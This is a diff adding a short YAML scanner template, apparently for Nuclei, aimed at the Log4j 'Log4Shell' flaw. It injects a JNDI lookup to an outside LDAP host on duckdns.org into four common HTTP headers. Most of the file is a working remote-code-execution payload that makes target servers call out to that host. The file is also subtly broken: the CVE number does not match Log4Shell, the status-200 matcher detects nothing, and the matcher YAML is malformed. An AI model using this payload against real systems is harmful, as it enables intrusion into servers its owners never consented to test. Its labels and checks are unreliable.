@@ -1,0 +1,25 @@
+id: CVE-2021-44832
+
+info:
+  name: Apache Log4j 2
+  author: t4r4ru
+  description: Log4Shell
+  tags: web, rce,
+
+requests:
+  - raw:
+      - |+
+        GET / HTTP/1.1
+        {{header}}: ${jndi:ldap://t4t4ru.duckdns.org:4567/a}
+    payloads:
+      header:
+        - User-Agent
+        - Pragma
+        - Cache-Control
+        - Referer
+    attack: batteringram
+    unsafe: true
+    matchers:
+        - type: status
+          status:
+          -200
